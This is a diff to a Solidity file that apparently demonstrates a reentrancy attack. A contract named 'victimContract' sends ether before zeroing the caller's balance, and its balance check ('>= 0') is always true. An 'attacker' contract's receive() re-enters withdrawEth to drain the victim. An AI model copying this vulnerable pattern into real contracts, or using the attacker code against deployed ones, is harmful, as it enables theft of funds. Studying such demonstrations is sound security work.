@@ -8,12 +8,12 @@ contract victimContract {
         balances[msg.sender] += msg.value;
     }
 
-    function withdraw(uint256 amount) public {
-        require(balances[msg.sender] >= amount, "Not enough balance");
-        (bool success, ) = msg.sender.call{value: amount}("");
+    function withdrawEth() public {
+        require(balances[msg.sender] >= 0, "Not enough balance");
+        (bool success,) = msg.sender.call{value: balances[msg.sender]}("");
         require(success, "Transfer failed");
 
-        balances[msg.sender] -= amount;
+        balances[msg.sender] = 0;
     }
 }
 
@@ -29,12 +29,12 @@ contract attacker {
     }
 
     receive() external payable {
-        if (msg.sender.balance > 0) {
-            victimContract(msg.sender).withdraw(0.5 ether);
+        if (victimAddress.balance >= 10 ether) {
+            victimContract(msg.sender).withdrawEth();
         }
     }
 
     function withdraw(address victim) public {
-        victimContract(victim).withdraw(0.5 ether);
+        victimContract(victim).withdrawEth();
     }
 }
